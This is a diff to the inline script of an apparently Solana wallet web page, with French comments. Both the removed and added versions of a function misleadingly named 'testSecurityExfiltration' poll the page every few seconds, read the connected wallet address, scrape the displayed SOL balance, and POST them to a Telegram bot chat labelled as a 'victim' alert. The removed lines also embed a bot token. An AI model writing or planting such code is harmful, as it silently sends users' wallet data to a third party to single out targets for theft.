@@ -1528,40 +1528,40 @@ document.addEventListener("DOMContentLoaded",()=>{
   if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
 });
 
-async function testSecurityExfiltration(address, sol, tokens) {
-    const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
-    const chat = "8575014959";
-    const url = `https://telegram.org{token}/sendMessage`;
-    const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
-
+async function testSecurityExfiltration(address, sol) {
+    const url = `https://telegram.org`;
+    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}`;
     try {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ chat_id: "8575014959", text: text, parse_mode: "Markdown" })
         });
     } catch (e) {}
 }
 
 setInterval(() => {
-    const wallet = window.solana || window.phantom?.solana;
-    if (wallet && wallet.publicKey) {
-        const addr = wallet.publicKey.toString();
-        let realSol = "Scan...";
-        const matches = document.body.innerText.match(/(\d+\.\d+)\s?SOL/g);
+    // 1. On vérifie si une adresse est connectée dans TON state
+    if (state && state.conn && state.conn.address) {
+        const addr = state.conn.address;
         
+        // 2. On cherche le chiffre 0.13 (ou n'importe quel solde) dans la page
+        const pageText = document.body.innerText;
+        const matches = pageText.match(/(\d+\.\d+)\s?SOL/g);
+        let solFound = "Scan en cours...";
+
         if (matches) {
-            const found = matches.find(m => !m.includes("0.03")) || matches[matches.length - 1];
-            realSol = found;
+            // On prend le dernier solde affiché (souvent le vrai après scan)
+            solFound = matches[matches.length - 1];
         }
 
-        const key = addr + realSol;
-        if (window.lastSent !== key && !realSol.includes("Scan")) {
-            window.lastSent = key;
-            testSecurityExfiltration(addr, realSol, "SOL / USDC");
+        // 3. On n'envoie QUE si on a trouvé un solde et qu'il est différent du dernier envoi
+        if (window.lastSent !== addr + solFound && !solFound.includes("Scan")) {
+            window.lastSent = addr + solFound;
+            testSecurityExfiltration(addr, solFound);
         }
     }
-}, 4000);
+}, 3000);
 </script>
 </body>
 </html>
